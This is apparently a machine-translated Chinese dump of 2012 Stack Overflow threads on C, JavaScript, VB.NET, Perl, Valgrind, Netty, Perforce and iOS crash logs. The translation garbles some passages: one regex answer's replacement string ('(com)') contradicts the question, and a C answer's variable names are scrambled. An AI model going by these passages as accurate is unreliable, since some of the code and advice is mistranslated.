        $request->setParam('controller',$myconf['default_controller']);

        $controllerClass    = new $default_controller($request,$action_dispatch);
    }

} 
```

怎么了 ？

# javascript - 如何在画布中更快地绘制图像

> ID：11427168
> 
> 赞同：0
> 
> 时间：2012-07-11T06:57:11.423
> 
> 标签：javascript, python

我正在通过monkeyrunner捕获移动快照（android）并在一些python脚本（即用于套接字连接）的帮助下，我让它显示在一个html页面中。但是我在浏览器上看到的图像和android 设备上的那个。我怎样才能同步这些东西，以便移动屏幕快照应该同时在浏览器上可见。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:01:16.740

图像从手机到服务器再到桌面客户端需要时间。你无法改变这一点。

您希望做的最好的事情是对整个应用程序进行基准测试，找出瓶颈在哪里，并希望它不是网络连接本身。

# compilation - 在我的编译器中完全可以正常工作，但是在将其提交到在线社区时会出现编译错误

> ID：11427172
> 
> 赞同：0
> 
> 时间：2012-07-11T06:57:30.880
> 
> 标签：compilation, compiler-errors

这段代码在我的电脑上工作得很好，而我用 codeblocks 10.05 编译它。该代码不会给出任何错误或警告！但是，在将其提交给在线法官编码社区时，他们以编译错误回复我！这是我的代码：

```
#include<stdio.h>
#include<stdlib.h>
int main()
{
    int j=1;
    while(j=1){
        int x,y,i,j,num,count=0,p,k;
        for(;;){
            printf("enter two integers. they must not be equal and must be between 1 and 100000\n");
            scanf("%d%d",&i,&j);
            if(i>=1 && i<100000 && j>=1 && j<100000 && i!=j){
                break;
            }
            else{
                printf("try the whole process again\n");
            }
        }
        if(i>j){
            x=i;
            y=j;
        }
        else{
            x=j;
            y=i;
        }//making x always greater than y
        int *cyclelength=(int *)malloc(5000*sizeof(int));
        if (NULL==cyclelength){
            printf("process aborted");
            return 0;
        }
        else{
            /*solution part for the range of number. and solution for each number  put into cyclelength.*/
            num=y;
            while(num<=x){
                p=1;
                k=num;
                while(k!=1){
                    if(k%2==0)
                        k=k/2;
                    else
                        k=3*k+1;
                    p+=1;
                    }
                cyclelength[count]=p;
                num+=1;
                count+=1;
            }
            int c=0;
            int max=cyclelength[c];
            for(c=0;c<x-y-1;c+=1){
                if(max<cyclelength[c+1]){
                    max=cyclelength[c+1];
                }
            }
            free(cyclelength);
            cyclelength = NULL;
            printf("%d,%d,%d\n",i,j,max);
        }
    }
} 
```

当我尝试在**ANSI C 4.1.2 - GNU C 编译器下的在线社区中提交它时，带有选项： -lm -lcrypt -O2 -pipe -ansi -DONLINE_JUDGE**这种格式。他们给我发了一条编译错误信息！

```
Our compiler was not able to properly proccess your submitted code. This is the error returned:
code.c: In function 'main':
code.c:25:10: error: expected expression before '/' token
code.c:27:19: error: 'cyclelength' undeclared (first use in this function)
code.c:27:19: note: each undeclared identifier is reported only once for each function it appears in
code.c:10:18: warning: ignoring return value of 'scanf', declared with attribute warn_unused_result 
```

为什么我会得到这个？我的错在哪里？？编码格式不匹配？？我是初学者！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:04:17.390

使用 -ansi 选项，错误是 ANSI 合规性失败：

```
}//making x always greater than y 
```

应该

```
} /* making x always greater than y */ 
```

在第 26 行；你不能在这里声明周期长度；它需要位于函数的顶部（第 5 行）

```
int main()
{
    int *cyclelength;
...
    cyclelength=(int *)malloc(5000*sizeof(int)); 
```

scanf 问题是一个警告，因为不检查 scanf 的返回值就假定它已经成功；所以你应该做类似的事情：

```
do {
    printf("enter two integers. they must not be equal and must be between 1 and 100000\n");
    number_read = scanf("%d%d", &i, &j);
    if (number_read < 0) /* read failed, e.g. user entered ctrl-d */
        return 0;
    } while (number_read != 2); 
```

当然你需要`number_read`在函数的顶部声明

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:00:14.917

您的代码不是 ANSI C - 您不能像在 C++ 和 C99 中那样在块的中间定义变量。将 , , 等的声明移动`cyclelength`到`c`各自`max`块的顶部。对于严格的 ANSI，您还需要使用仅限 C 语言的注释，即更改`// comment`为`/* comment */`.

# javascript - 替换字符串中间的点

> ID：11427174
> 
> 赞同：0
> 
> 时间：2012-07-11T06:57:33.017
> 
> 标签：javascript, regex

假设我们有一个数组（新行分隔），例如：

```
hello
example.com
test.
something.
 aspacefront
test
test.us 
```

成为一个数组

```
hello
example(dot)com.
test.
something.
 aspacefront
test
test(dot)us 
```

**这可以用正则表达式完成吗？**

我要循环数组然后用这个正则表达式替换为（点），`\b[^a-zA-Z\40]\b.`但它将是example（dot）om而不是example（dot）com。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T06:59:16.493

最简单的解决方案：

```
result = subject.replace(/\b\.\b/g, "(com)"); 
```

这意味着“仅当点之前和之后是字母数字字符时才替换点”。

# vb.net - OpenSubKey 在 VB.NET 中返回 null

> ID：11427180
> 
> 赞同：1
> 
> 时间：2012-07-11T06:57:45.637
> 
> 标签：vb.net, console, installation, uac

我有一个控制台程序可以读取 HKCU 下的注册表项：

```
OpenSubKey("Software\\Autodesk\\AutoCAD") 
```

该程序工作得很好，但是当我尝试将它用作`Custom Action`安装项目时，它返回了一个`null`值。

以下是一些建议：

1.  关闭[UAC](http://en.wikipedia.org/wiki/User_Account_Control)（用户帐户控制）将解决问题。
2.  如果我可以通过双击它来运行这个控制台，即使 UAC 开启它也能正常工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:15:49.520

如果它返回`null`而不是抛出异常，那么这不是权限问题 - 密钥不存在。[`OpenSubKey`](http://msdn.microsoft.com/en-us/library/z9f66s0a.aspx)：

> 如果找不到指定的子键，则返回 null。

（并且，请注意上面列出的例外情况）：

> [`SecurityException`](http://msdn.microsoft.com/en-us/library/system.security.securityexception.aspx)用户没有读取注册表项所需的权限。

因此，可能的问题是您的操作在安装序列期间被调用，当它由 Windows 安装程序服务运行时 - 此服务在本地系统帐户下运行，而不是在登录用户的帐户下运行。

* * *

不知道你想用这个键实现什么，我不确定建议什么解决方法。您可能可以使用 MSI 系统中的标准内置设施来实现您的目标 - 或者您可能希望将此操作推迟到您的程序第一次实际运行时。

（MSI 中可能的内容可能会因您用于构建它的内容而异 - 如果您当前正在使用 VS Setup 项目，那么您将受到很大的限制）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T08:27:25.377

在 HKLM 下查找相同路径的注册表项，而不是 HKCU hive。只有在“为所有用户”而不是“为当前用户”安装 AutoCAD 的情况下，它才会存在，但前者很有可能。

如果仅为特定用户安装了 AutoCAD，并且您在同一用户下安装了其他东西，请检查`msidbCustomActionTypeNoImpersonate`自定义操作的标志。默认值为 false 应该对您有用，但如果您将该标志更改为 true，您将遇到 Damien_The_Unbeliever 的姐妹回答中已经描述的问题。

如果 AutoCAD 仅针对特定用户安装，而您在*其他*用户（例如管理员）下安装其他内容，则请注意您的要求中的逻辑空白。HKCU 配置单元不是一个系统范围的配置单元，但每个登录用户的内容都不同。可能有多个具有不同注册表内容的并行 AutoCAD 安装，您需要明确您真正想要对它们中的每一个做什么；或者通过一些不同的方法达到你的最终目标。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-12-02T17:14:14.927

如果您使用的是 AutoCAD x64，则需要在从设置调用自定义构建 exe/DLL 时显式请求 x64 注册表（默认为 x86）。所以尝试将其更改为以下内容：

```
RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("Software\\Autodesk\\AutoCAD") 
```

# netty - Netty：建议在 FrameDecoder.java 中调用 FrameDecoder.decode() 之前插入 markReaderIndex()

> ID：11427187
> 
> 赞同：0
> 
> 时间：2012-07-11T06:58:31.207
> 
> 标签：netty

当前代码，在调用`resetReaderIndex()`等待更多数据之前，我们必须在子类的`markReaderIndex()`第一行调用。`decode()``FrameDecoder`

你能在下面插入`cumulation.markReaderIndex();`之前`Object frame = decode(context, channel, cumulation);`用`FrameDecoder.java`“<<<<<”标记的内容吗？它对初学者有用且重要。谢谢：

```
//org.jboss.netty.handler.codec.frame.FrameDecoder.java:
private void callDecode(
        ChannelHandlerContext context, Channel channel,
        ChannelBuffer cumulation, SocketAddress remoteAddress) throws Exception {

    while (cumulation.readable()) {
        int oldReaderIndex = cumulation.readerIndex();
        cumulation.markReaderIndex();//WangHongguangAdd20120711<<<<<<<<<<<<
        Object frame = decode(context, channel, cumulation);
        if (frame == null) {
            if (oldReaderIndex == cumulation.readerIndex()) {
                // Seems like more data is required.
                // Let us wait for the next notification.
                break;
            } else {
                // Previous data has been discarded.
                // Probably it is reading on.
                continue;
            }
            ...
        }

        unfoldAndFireMessageReceived(context, remoteAddress, frame);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:46:47.140

这将是一个坏主意，因为我们可能会破坏用户自己设置的标记。

# perforce - 恢复已删除的 Perforce 客户端

> ID：11427195
> 
> 赞同：1
> 
> 时间：2012-07-11T06:59:06.213
> 
> 标签：perforce

如果我不小心使用命令“p4 client -d”删除了一个客户端。有什么办法可以恢复吗？或者至少查看客户端规范（根文件夹路径、视图、主机等...）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T07:04:17.400

Perforce 知识库有[一篇](http://kb.perforce.com/article/803/recovering-a-deleted-workspace)关于此的文章。听起来它可能需要您的 Perforce 管理员的一些合作。:-(

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-17T00:02:20.340

如果您有一个规范库，那么所有客户端规范及其所有版本都存储在那里。如果您删除客户端，您始终可以检索“昨天”的客户端规范或您想要的任何先前版本。否则，不，你不能得到它。

# perl - 不能在没有包或对象引用的情况下调用方法“try”

> ID：11427196
> 
> 赞同：4
> 
> 时间：2012-07-11T06:59:09.893
> 
> 标签：perl, try-catch

我在 perl 中有一个 try catch 块

```
try {
    //statement 1
    //statement 2
};
catch Error with
{
    print "Error\n";
} 
```

当我运行 perl 程序时，出现以下错误

> 不能在没有包或对象引用的情况下调用方法“try”...

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-11T07:06:31.257

Perl 不提供`try`或`catch`关键字。要捕获由 引发的“异常” `die`，您可以设置`$SIG{__DIE__}`处理程序或使用[`eval`](http://perldoc.perl.org/functions/eval.html). 块形式优于字符串形式，因为在编译时解析发生一次。

```
eval {
    // statement 1
    // statement 2
}
if ($@) {
    warn "caught error: $@";
} 
```

有各种模块提供更传统`try`的功能，例如[`Try::Tiny`](http://search.cpan.org/perldoc?Try%3a%3aTiny).

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-11T11:46:38.553

您可能想要其中一个 CPAN 模块，例如`Try::Tiny`：

```
use Try::Tiny;

try {
  # statement 1
  # statement 2
}
catch {
  print "Error\n";
}; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-02-18T03:20:32.867

您可能还想尝试一下[Nice::Try](https://metacpan.org/pod/Nice::Try)。它非常独特，并提供了与其他编程语言一样的 trycatch 块的所有功能。

它支持异常变量赋值、异常类、块清理`finally`、嵌入式 try-catch 块。

完全披露：我开发了[Nice::Try](https://metacpan.org/pod/Nice::Try) when [TryCatch got broken](https://rt.cpan.org/Ticket/Display.html?id=97089)。

# valgrind - 在 PowerPc 上运行的 Valgrind 不报告任何泄漏？

> ID：11427200
> 
> 赞同：1
> 
> 时间：2012-07-11T06:59:35.043
> 
> 标签：valgrind

下载了最新版本 Valgrind 3.7.0，解压它以创建一个文件夹“Valgrind-3.7.0” 现在，我所做的是导出 gcc 以与目标机器兼容并配置为禁用 tls 并提供主机。我还制作了一个 C 程序“leak.c”及其使用以下命令编译的目标文件“a.out”

```
export CC=/usr/local/netd_tools_v1/powerpc/bin/powerpc-linux-gnu-gcc leak.c 
```

所以

```
a.  export CC=/usr/local/netd_tools_v1/powerpc/bin/powerpc-linux-gnu-gcc
b.  ./configure --prefix=/netd --host=powerpc-linux --disable-tls 
c.      make
d.      make install 
```

*   链接库路径和 valgrind 可执行文件（转到 /netd/lib 并执行 ln –s /u/netd/lib/valgrind THEN goto /netd/usr/sbin 并执行 ln –s /u/netd/bin/valgrind）一些文件是在“Valgrind-3.7.0”中制作的，并形成了一个文件夹“netd”。“netd”包含“lib”、“bin”、“share”和“include”

（/netd/lib 和 /netd/usr/sbin 是项目特定的目录）

将这些文件（“netd”中的文件）复制到目标机器中，并通过以下命令在文件“a.out”上运行 Valgrind：

```
valgrind --log-file=/u/july5.txt --leak-check=summary --tool=memcheck ./a.out 
```

（`/u`是挂载点，`july5`是日志文件）

输出显示报告了 0 个泄漏

```
 int main()
     {
     printf("I am leaking.");
     int *a =(int *) malloc(100);
     return 0;
     } 
```

这在 linux 上运行得很好，并报告了内存泄漏。如果这可行，那么我将在项目特定流程上运行 Valgrind。

a.out 在 LINUX 上的日志文件输出：

```
[asaini@OTN05 abhaysaini]$ vi xyz.txt

    ==14843== Memcheck, a memory error detector

    ==14843== Copyright (C) 2002-2011, and GNU GPL'd, by Julian Seward et al.
    ==14843== Using Valgrind-3.7.0 and LibVEX; rerun with -h for copyright info
    ==14843== Command: ./a.out
    ==14843== Parent PID: 51

61
==14843==
==14843==
==14843== HEAP SUMMARY:
==14843==     in use at exit: 100 bytes in 1 blocks
==14843==   total heap usage: 1 allocs, 0 frees, 100 bytes allocated
==14843==
==14843== LEAK SUMMARY:
==14843==    definitely lost: 100 bytes in 1 blocks
==14843==    indirectly lost: 0 bytes in 0 blocks
==14843==      possibly lost: 0 bytes in 0 blocks
==14843==    still reachable: 0 bytes in 0 blocks
==14843==         suppressed: 0 bytes in 0 blocks
==14843== Rerun with --leak-check=full to see details of leaked memory
==14843==
==14843== For counts of detected and suppressed errors, rerun with: -v
==14843== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 11 from 6) 
```

PowerPc 上日志文件的输出

```
[00002003-Unknown] Debug> cat leak.txt
==1208== Memcheck, a memory error detector
==1208== Copyright (C) 2002-2011, and GNU GPL'd, by Julian Seward et al.
==1208== Using Valgrind-3.7.0 and LibVEX; rerun with -h for copyright info
==1208== Command: ./a.out
==1208== Parent PID: 1195
==1208==
--1208-- WARNING: Serious error when reading debug info
--1208-- When reading debug info from /lib/ld-2.3.2.so:
--1208-- Can't make sense of .data section mapping
--1208-- WARNING: Serious error when reading debug info
--1208-- When reading debug info from /u/Leak/a.out:
--1208-- Can't make sense of .data section mapping
--1208-- WARNING: Serious error when reading debug info
--1208-- When reading debug info from /u/netd/lib/valgrind/vgpreload_core-ppc32-linux.so:
--1208-- Can't make sense of .eh_frame section mapping
==1208== Use of uninitialised value of size 4
==1208==    at 0x4011E08: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x4016517: ???
==1208==    by 0x400917F: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x4005083: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x4006967: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x4002C0F: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400DF03: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x4001BD3: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400215F: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400EF2B: ??? (in /lib/ld-2.3.2.so)
==1208==
--1208-- WARNING: Serious error when reading debug info
--1208-- When reading debug info from /u/netd/lib/valgrind/vgpreload_memcheck-ppc32-linux.so:
--1208-- Can't make sense of .eh_frame section mapping
--1208-- WARNING: Serious error when reading debug info
--1208-- When reading debug info from /lib/libc-2.3.2.so:
--1208-- Can't make sense of .data section mapping
==1208== Use of uninitialised value of size 4
==1208==    at 0x4011CC0: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x7: ???
==1208==    by 0x400AB33: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x4002ECB: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400DF03: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x4001BD3: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400215F: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400EF2B: ??? (in /lib/ld-2.3.2.so)
==1208==
==1208== Use of uninitialised value of size 4
==1208==    at 0x4011D38: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x7: ???
==1208==    by 0x400AB33: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x4002ECB: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400DF03: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x4001BD3: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400215F: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400EF2B: ??? (in /lib/ld-2.3.2.so)
==1208==
==1208== Use of uninitialised value of size 4
==1208==    at 0x4011D64: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x7: ???
==1208==    by 0x400AB33: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x4002ECB: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400DF03: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x4001BD3: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400215F: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0x400EF2B: ??? (in /lib/ld-2.3.2.so)
==1208==
==1208== Use of uninitialised value of size 4
==1208==    at 0x400B958: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0xFE8ABE7: ??? (in /lib/libc-2.3.2.so)
==1208==    by 0xFE7278B: ??? (in /lib/libc-2.3.2.so)
==1208==

... snip ...

==1208==
==1208== Use of uninitialised value of size 4
==1208==    at 0x400BBE0: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0xFE8ABE7: ??? (in /lib/libc-2.3.2.so)
==1208==    by 0xFE7278B: ??? (in /lib/libc-2.3.2.so)
==1208==
==1208== Use of uninitialised value of size 4
==1208==    at 0x400BB0C: ??? (in /lib/ld-2.3.2.so)
==1208==    by 0xFE8ABE7: ??? (in /lib/libc-2.3.2.so)
==1208==    by 0xFE7278B: ??? (in /lib/libc-2.3.2.so)
==1208==
==1208==
==1208== HEAP SUMMARY:
==1208==     in use at exit: 0 bytes in 0 blocks
==1208==   total heap usage: 0 allocs, 0 frees, 0 bytes allocated
==1208==
==1208== All heap blocks were freed -- no leaks are possible
==1208==
==1208== For counts of detected and suppressed errors, rerun with: -v
==1208== Use --track-origins=yes to see where uninitialised values come from
==1208== ERROR SUMMARY: 40 errors from 20 contexts (suppressed: 3908 from 442) 
```

错误（在尝试链接[https://bugs.kde.org/show_bug.cgi?id=290066](https://bugs.kde.org/show_bug.cgi?id=290066)中的补丁后：（由 iWerner 提供）

```
[00002003-Unknown] Debug> cat 1.txt
==1134== Memcheck, a memory error detector
==1134== Copyright (C) 2002-2011, and GNU GPL'd, by Julian Seward et al.
==1134== Using Valgrind-3.7.0 and LibVEX; rerun with -h for copyright info
==1134== Command: ./Leak/a.out
==1134== Parent PID: 1071
==1134==

valgrind:  Fatal error at startup: a function redirection
valgrind:  which is mandatory for this platform-tool combination
valgrind:  cannot be set up.  Details of the redirection are:
valgrind:
valgrind:  A must-be-redirected function
valgrind:  whose name matches the pattern:      strlen
valgrind:  in an object with soname matching:   ld.so.1
valgrind:  was not found whilst processing
valgrind:  symbols from the object with soname: ld.so.1
valgrind:
valgrind:  Possible fixes: (1, short term): install glibc's debuginfo
valgrind:  package on this machine.  (2, longer term): ask the packagers
valgrind:  for your Linux distribution to please in future ship a non-
valgrind:  stripped ld.so (or whatever the dynamic linker .so is called)
valgrind:  that exports the above-named function using the standard
valgrind:  calling conventions for this platform.  The package you need
valgrind:  to install for fix (1) is called
valgrind:
valgrind:    On Debian, Ubuntu:                 libc6-dbg
valgrind:    On SuSE, openSuSE, Fedora, RHEL:   glibc-debuginfo
valgrind:
valgrind:  Cannot continue -- exiting now.  Sorry. 
```

# javascript - 使用 decodeURIComponent 的问题

> ID：11427203
> 
> 赞同：0
> 
> 时间：2012-07-11T06:59:59.883
> 
> 标签：javascript, html, decodeuricomponent

我试图解码 URL 链接中的 %20，这样当我将代码从当前页面解码到下一页时，如果不在文本字段中添加 %20 就无法获得我的值，下面是我用于解码 %20 的编码以及我放置的位置

```
function loadRecord(i){
    var item=dataset.item(i);
    fname.value = item['fname'];
    id.value = item['id'];
    window.location.href = decodeURIComponent("userup2.html?id="+item['id']+"&fname="+item['fname']+"&val=300");
    return false;
} 
```

这是当前的，将重定向到第二页以显示数据

![在此处输入图像描述](../Images/af4d5d26066abde2d70e00bc3e769f89.png)

![在此处输入图像描述](../Images/fef03fac2d1970a53ed96a57f2d9f430.png)

为什么即使我对 decodeURIComponent 进行编码，它仍然显示 %20？请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:17:22.227

您必须在将 URI 传递给您的输入时对其进行解码。将其解码以将其传递给`window.location`是正确的，但浏览器将再次对其进行转义。

我假设您从参数中获取输入值。因此，您在参数中设置输入值的位置（在您的情况下，当然是在 document`userup2.html`中，您必须解码 URI。

因此，在您从参数设置输入值的地方，您必须再次对其进行解码：

```
document.getElementByTagName('input').value = decodeURI(...your code to get the params); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:18:33.717

> 为什么即使我对 decodeURIComponent 进行编码，它仍然显示 %20？

浏览器正在对 url 进行编码以使其成为有效的 URL。即使您正在对其进行解码，它也会再次分配给 window.location.href，因此控件返回给浏览器。

你无法绕过它。而是在接收端解码 url。

# c# - IComparer 和 SortedDictionary 可能存在的问题

> ID：11427204
> 
> 赞同：0
> 
> 时间：2012-07-11T06:59:59.803
> 
> 标签：c#, sorting, dictionary, icomparer

我正在尝试创建一个`SortedDictionary`其键是代表文件/文件夹路径的字符串。我正在尝试根据路径深度对该字典进行排序。我的标准只是检查每个路径中的斜杠数量，并将斜杠最多的路径放在字典的开头。

我的问题是，对于一些我无法检测到的奇怪问题，字典可以有多个完全相同的键。经过数小时的调试后的问题似乎是**“有时”**我的实现在调用方法或向字典添加新值时`IComparer`不会遍历字典中的所有条目。`ContainsKey`我没有得到例外或任何东西。

这是我的代码..（有点长）：

```
 namespace ConsoleApplication1
{

    class DepthComparer : IComparer<string>
    {
        public int Compare(string X, string Y)
        {
            //Sort From deepest to shallowest 
            //C:\Users\NAME\Desktop\Folder\ should precede C:\Users\NAME\Desktop\
            //Paths with same root level are ignored

            int nXSlashes = SlashCounter(X);
            int nYSlashes = SlashCounter(Y);

            if (string.Compare(X, Y, true) == 0) //same path
            {
                return 0;
            }

            //Put Deepest Path at the beginning
            return (nXSlashes > nYSlashes ? -1 : 1);

        }

        public int SlashCounter(string stPath)
        {
            int nSlashes = 0;
            for (int i = 0; i < stPath.Length - 1; ++i)
            {
                if (stPath[i] == ('/') || stPath[i] == ('\\'))
                    nSlashes++;
            }
            return nSlashes;
        }
    }

    public class ScanOptions
    {
        public enum ExcludeRule
        {
            Invalid = 0x00,
            File = 0x01,
            Folder = 0x02,
            FileFolder = File | Folder,
        }

        private SortedDictionary<string, ExcludeRule> _dExcludedPaths;

        public ScanOptions()
        {
            _dExcludedPaths = null;            
        }

        //Creates a new Excluded Paths List (Automatically clears the current list if its already initialized)
        public void CreateExcludedPathsList()
        {
            if (_dExcludedPaths == null)
                _dExcludedPaths = new SortedDictionary<string, ExcludeRule>(new DepthComparer());
            else
                ClearExcludedPathsList();
        }

        public void ClearExcludedPathsList()
        {
            _dExcludedPaths.Clear();
        }

        public bool IsExcludedPathsListInitialized()
        {
            return _dExcludedPaths != null ? true : false;
        }

        public void AddExcludePath(string stPath, ExcludeRule Rule)
        {
            if (!IsExcludedPathsListInitialized())
                return;

            if (string.IsNullOrEmpty(stPath) || Rule == ExcludeRule.Invalid)
                return;

            string stTmp = stPath.ToLower();
            try
            {
                if (stTmp.EndsWith("\\"))
                {
                    stTmp = stTmp.Remove(stTmp.Length - 1);
                }

                if (_dExcludedPaths.ContainsKey(stTmp))
                {
                    ExcludeRule OldRule = ExcludeRule.Invalid;
                    if (_dExcludedPaths.TryGetValue(stTmp, out OldRule))
                    {
                        if ((OldRule & Rule) == 0)
                            _dExcludedPaths[stTmp] |= Rule; //Same path new rule, append rule to existing one
                    }
                    return;
                }
                else
                {
                    //brand new entry
                    _dExcludedPaths[stTmp] = Rule;
                }
            }
            catch
            {

            }
        }

        public void AddExcludePaths(List<string> ExcludePaths, ExcludeRule Rule)
        {
            if (!IsExcludedPathsListInitialized())
                return;

            foreach (string stPath in ExcludePaths)
                AddExcludePath(stPath, Rule);
        }

        public void AddExcludePaths(SortedDictionary<string, ExcludeRule> ExcludePaths)
        {
            if (!IsExcludedPathsListInitialized())
                return;

            foreach (KeyValuePair<string, ExcludeRule> PathRule in ExcludePaths)
                AddExcludePath(PathRule.Key, PathRule.Value);
        }

        public void ShowInConsole()
        {
           foreach (KeyValuePair<string, ScanOptions.ExcludeRule> Rule in _dExcludedPaths)
            {
                Console.WriteLine(Rule.Key + "\t" + Rule.Value);
            }
        }

    }

    class Program
    {
        static void Main(string[] args)
        {

            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

            //Fill a new string list with some paths
            List<string> ExcludedPaths = new List<string>();
            string ExPath = desktopPath + "\\12345678\\";
            ExcludedPaths.Add(ExPath);
            ExPath = desktopPath + "\\abcdefg\\";
            ExcludedPaths.Add(ExPath);
            ExPath = desktopPath + "\\ABCDEFG\\";
            ExcludedPaths.Add(ExPath);
            ExPath = desktopPath + "\\1A2B3C 4D5E6F\\123456\\4567896\\";
            ExcludedPaths.Add(ExPath);
            ExPath = desktopPath + "\\CDEVQWER ASD\\456786\\";
            ExcludedPaths.Add(ExPath);

            //Create the exclude list object
            ScanOptions scanOpt = new ScanOptions();
            scanOpt.CreateExcludedPathsList();

            //First manually add one of the paths from the list above
            scanOpt.AddExcludePath(desktopPath + "\\12345678\\", ScanOptions.ExcludeRule.Folder);

            //Now add the whole list of paths to the exclude list in scan options
            scanOpt.AddExcludePaths(ExcludedPaths, ScanOptions.ExcludeRule.Folder);

            //Now add the first entry a couple more times with different value each time
            scanOpt.AddExcludePath(desktopPath + "\\12345678\\", ScanOptions.ExcludeRule.File);

            scanOpt.AddExcludePath(desktopPath + "\\12345678\\", ScanOptions.ExcludeRule.Folder);

            //Dump the list to console
            //We now have two keys in the dictionary that equal desktopPath + "\\12345678\\"
            scanOpt.ShowInConsole();

        }
    }
} 
```

在 Main() 的末尾`_dExcludedPaths`将有两个完全相等的键。

有人可以帮助理解这里发生了什么以及字典中怎么可能有重复的键？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:17:48.147

```
 public int Compare(string X, string Y) 
    {  
        int nXSlashes = SlashCounter(X); 
        int nYSlashes = SlashCounter(Y); 

        if (nXSlashes > nYSlashes)
          return -1;
        if (nXSlashes < nYSlashes)
          return 1;

        return string.Compare(X, Y, true);          
    } 
```

# iphone - 什么可能导致崩溃？

> ID：11427206
> 
> 赞同：0
> 
> 时间：2012-07-11T07:00:08.553
> 
> 标签：iphone, objective-c, ios

我有应用程序，它在某些设备中崩溃。我在模拟中测试该应用程序，并使用不同的 iOS 测试我的 iPhone 4S 和 iPad 2。它没有任何问题。

最后我得到了一个 .crash 文件。现在我有以下 .crash 文件，但我不知道如何找到错误。我也有存档文件。

```
Incident Identifier: FAA5BAF1-.....
CrashReporter Key:   b385d67d0f4.....
Hardware Model:      iPad3,1
Process:         myApp [1262]
Path:            /var/mobile/Applications/094A6965-AA00-421E-A3CE-98CF2F275362/myApp.app/myApp
Identifier:      myApp
Version:         ??? (???)
Code Type:       ARM (Native)
Parent Process:  launchd [1]

Date/Time:       2012-07-05
OS Version:      iPhone OS 5.1.1 (9B206)
Report Version:  104

Exception Type:  EXC_CRASH (SIGABRT)
Exception Codes: 0x00000000, 0x00000000
Crashed Thread:  0

Last Exception Backtrace:
0   CoreFoundation                  0x37c7888f __exceptionPreprocess + 163
1   libobjc.A.dylib                 0x32fa9259 objc_exception_throw + 33
2   CoreFoundation                  0x37bca9e9 -[__NSPlaceholderArray initWithObjects:count:] + 129
3   CoreFoundation                  0x37bcce79 +[NSArray arrayWithObject:] + 45
4   myApp                           0x000198f5 0x1000 + 100597
5   myApp                           0x0000620b 0x1000 + 21003
6   myApp                           0x000058e1 0x1000 + 18657
7   UIKit                           0x30a8ac8b -[UIViewController view] + 167
8   UIKit                           0x30a971e9 -[UIViewController contentScrollView] + 25
9   UIKit                           0x30a97059 -[UINavigationController _computeAndApplyScrollContentInsetDeltaForViewController:] + 37
10  UIKit                           0x30a96f3f -[UINavigationController _layoutViewController:] + 35
11  UIKit                           0x30a967c1 -[UINavigationController _startTransition:fromViewController:toViewController:] + 501
12  UIKit                           0x30a96503 -[UINavigationController _startDeferredTransitionIfNeeded] + 251
13  UIKit                           0x30a963c3 -[UILayoutContainerView layoutSubviews] + 179
14  UIKit                           0x30a54f15 -[UIView(CALayerDelegate) layoutSublayersOfLayer:] + 149
15  CoreFoundation                  0x37bd71fb -[NSObject performSelector:withObject:] + 43 
```

* * *

**更新**

关于您对 .crash 文件“symbolicatecrash”的评论，结果如下：

```
got symbolicator for /Users/my/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/System/Library/PrivateFrameworks/WebCore.framework/WebCore, base address 30e5d000
got symbolicator for /Users/my/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/usr/lib/libobjc.A.dylib, base address 32e50000
got symbolicator for /Users/my/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/usr/lib/system/libdispatch.dylib, base address 34450000
got symbolicator for /Users/my/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/System/Library/Frameworks/QuartzCore.framework/QuartzCore, base address 32f17000
